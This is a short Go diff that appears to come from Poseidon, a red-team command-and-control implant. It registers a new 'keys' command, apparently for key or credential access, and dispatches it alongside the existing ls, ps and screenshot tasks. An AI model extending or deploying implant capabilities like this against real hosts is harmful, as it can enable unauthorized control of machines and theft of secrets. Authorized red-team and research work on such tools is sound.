@@ -12,6 +12,7 @@ import (
 	"strconv"
 
 	"github.com/xorrior/poseidon/pkg/commands/cat"
+	"github.com/xorrior/poseidon/pkg/commands/keys"
 	"github.com/xorrior/poseidon/pkg/commands/ls"
 	"github.com/xorrior/poseidon/pkg/commands/ps"
 	"github.com/xorrior/poseidon/pkg/commands/screenshot"
@@ -81,6 +82,7 @@ func main() {
 		"ls":            11,
 		"python":        12,
 		"jxa":           13,
+		"keys":          14,
 		"none":          20,
 	}
 
@@ -173,6 +175,10 @@ func main() {
 				//List directory contents
 				go ls.Run(task, res)
 				break
+
+			case 14:
+				go keys.Run(task, res)
+
 			case 20:
 				// No tasks, do nothing
 				break
